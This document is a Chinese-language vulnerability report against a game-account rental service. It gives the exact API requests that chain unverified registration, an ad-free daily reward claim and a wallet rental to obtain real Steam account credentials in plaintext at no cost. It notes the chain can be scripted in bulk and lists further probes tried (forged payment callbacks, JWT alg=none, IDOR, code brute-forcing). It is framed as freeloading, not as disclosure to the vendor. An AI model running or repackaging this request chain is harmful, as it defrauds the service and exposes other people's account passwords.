# 租号么 免费租号漏洞报告（0 元换出真实 Steam 账号）

> 实测时间：2026-11-08 14:07–14:27 (UTC+8)　目标：https://web.zuhaome.com 、 https://api.zuhaome.com
> 结论：**不付钱、不需要管理员权限**——注册一个号 → 领一次"每日签到" → 直接换出真实 Steam 账号明文口令。全流程可脚本化批量。

## 一、三步漏洞链

| # | 请求 | 返回 |
|---|---|---|
| 1 | `POST /api/v1/auth/register` `{"username":"任意","password":"任意"}` | 200，无验证码/短信/邮箱/邀请校验 |
| 2 | `POST /api/v1/tasks/4/claim` `{}` | 200，到账 **4200 秒黄金时长**，无需看广告 |
| 3 | `POST /api/v1/rent` `{"game_id":348,"duration":4200,"source":"wallet"}` | 200，返回 `account_name` / `account_password` 明文 + 到期时间 |

关键点：
- `/tasks/4/claim` 只校验"今日是否已领"，**不校验广告完成状态**；`/tasks/1/claim` 才返回 `请先完成广告观看`——**task 4 是白给的 70 分钟**。
- 全程不碰支付：`/rent` 走 `source:"wallet"` 扣黄金时长，签到送的 4200 秒刚好够。
- 明文 Steam 口令由服务端下发；客户端那条 `The redemption code and password are not recorded.` 只是客户端日志不落盘，接口本身明文返回。
- 游客身份被拦（`403 游客登录仅支持兑换账号...`），必须注册，但注册无门槛。
- 部分游戏有会员墙：`黑神话：悟空 豪华版(id 134)` → `403 该游戏仅限 VIP/SVIP 会员领取`；普通版(id 348)可白嫖。

## 三、额度与扩容

| 项目 | 实测值 |
|---|---|
| 单号签到 | 4200 秒 / 天（一次领完，重复领 → `409 今日领取次数已达上限`） |
| 单次最长租 | 4200 秒 = 70 分钟（`duration` 上限即余额） |
| 超额 | `400 当前时长余额不足，请开通会员或充值` |
| 扩容 | 注册新号无验证 → **每天想要多少号就有多少号** |

## 四、可白嫖范围

`GET /api/v1/games` 共 **25,122 款**，扣掉 VIP 专属（34 款）、Denuvo 离线（2 款）等，绝大多数可 0 元换出。实测：黑神话：悟空(348)、赛博朋克 2077(143)、艾尔登法环：黑夜君临(52)。

## 五、已排除的死路（都实测过）

- 支付宝回调 `/api/v1/callbacks/payments/alipay`：无签名/伪签名 → `400 fail`，订单仍 pending。
- 微信回调 `/api/v1/callbacks/payments/wechat`：`400 ... wxPublicKey is nil`，伪造无效。
- 金额篡改：`hours` 仅限档位、`amount_fen` 服务端计算、`pay_channel` 白名单。
- `duration` 传 0 触发 validator，传负数照样走余额校验，无溢出。
- 兑换码 `/user/cdks/redeem`：第 7 次 `429`，默认 10 位随机码，爆破不可行。
- 管理员登录：5 次失败锁 24h（当前已锁），JWT 无弱密钥、`alg=none` 无效。
- 订单查询 `/pay/orders/{no}/status` 需登录且非本人订单 404，无 IDOR。
